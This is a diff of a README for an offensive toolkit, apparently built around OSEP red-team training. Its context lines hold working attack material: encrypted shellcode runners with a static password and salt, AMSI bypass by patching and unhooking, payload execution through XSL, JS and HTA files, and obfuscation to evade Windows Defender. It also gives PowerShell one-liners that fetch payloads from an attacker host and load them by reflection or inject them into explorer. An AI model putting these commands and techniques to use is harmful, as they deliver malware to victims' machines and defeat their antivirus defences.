@@ -97,23 +97,23 @@ drwxr-xr-x 9 kali kali  4096 Feb  2 08:20 ..
 ```
 
 
-## Shellcode Runners
+## 1. Shellcode Runners
 
-### [+] Triple DES
+### 1.1 Triple DES
 
 The 3DES payloads are located under ```payloads/3DES/``` directory. There are two payloads and need to be executed diferrently. Password and Salt are static values but you can modified them as you need.
 
 - **Password**: oqphnbt0kuedizy4m3avx6r5lf21jc8s
 - **Salt**: vh9b4tsxrl1560wg8nda2meuc7yjzop3
 
-#### Method 1
+#### 1.1.1 Method 1
 The executable **des_decryptor.exe** is downloading the file from your Web server and executes it reflectively.
 
 ```
 cmd> des_decryptor.exe http://KALI_IP/<SHELLCODE_RUNNER>
 ```
 
-#### Method 2
+#### 1.1.2 Method 2
 The executable ```des_decryptor_embeded.exe``` embedds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. Upload the file to the victim and execute it.
 
 ```
@@ -122,12 +122,12 @@ cmd> des_decryptor_embedded.exe
 
 ----
 
-### [+] AMSI Bypass
+### 1.2 AMSI Bypass
 There are two methods to bypass AMSI:
 - Patching 
 - Unhooking
 
-#### Method 1
+#### 1.2.1 Method 1
 Patching template is what Offensive-Security teaches in OSEP with some small changes. The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
 
 ```
@@ -146,7 +146,7 @@ You can copy the ```payloads/AMSI/shellcode_runner.txt``` to your web server as 
 powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
 ``` 
 
-#### Method 2
+#### 1.2.2 Method 2
 To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I've done some small modifications. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
 
 **Steps**
@@ -156,7 +156,7 @@ To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github
 
 ---
 
-### [+] Executing .XSL, .JS, .HTA
+### 1.3 Executing .XSL, .JS, .HTA
 
 Under directory ```payloads/DotNetToJScript/```, you find three shellcode ruuners that generated with **DotNetToJScript** (https://github.com/tyranid/DotNetToJScript). 
 
@@ -180,7 +180,7 @@ More execution methods can be found:
 - https://lolbas-project.github.io/
 
 
-### [+] ConfuserEx + Net-Obfuscator
+### 1.4 ConfuserEx + Net-Obfuscator
 
 During my tests, I noticed that Windows Defender could detect payloads genereted by **ConfuserEx** (https://github.com/yck1509/ConfuserEx). For this reason, I combined ```ConfuserEx + Net-Obfuscator``` (https://github.com/BinaryScary/NET-Obfuscate). 
 
@@ -196,7 +196,7 @@ First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesa
  [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
 ```
 ---
-## Execute .Net Assemblies with Reflection
+## 2. Execute .Net Assemblies with Reflection
 Bellow you can see some examples of how you can execute the Shellcode Runners with reflection.
 
 ```
@@ -212,29 +212,29 @@ $ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))
 
 ```
 ---
-## Downloaders
+## 3. Downloaders (One-Liners)
 
-### DownloadData + Reflection (No Proxy aware)
+### 3.1 DownloadData + Reflection (No Proxy aware)
 ```
 powershell -nop -exec bypass -c "$data=(New-Object Net.WebClient).DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
 ```
 
-### DownloadData + Invoke-ReflectivePEInjection
+### 3.2 DownloadData + Invoke-ReflectivePEInjection
 ```
 powershell -nop -exec bypass -c "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.136/shellcode_runner_assembly.exe');(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
 ```
 
-### DownloadString + AMSI Bypass + Proxy aware
+### 3.3 DownloadString + AMSI Bypass + Proxy aware
 ```
 powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$bytes=$webclient.DownloadString('http://KALI_IP/shellcode_runner.txt')|IEX;"
 ```
 
-### DownloadData + Proxy aware
+### 3.4 DownloadData + Proxy aware
 ```
 powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data = $webclient.DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
 ```
 
-## Output
+## 4. Output
 If everything goes well, you will get an output as bellow:
 
 ```
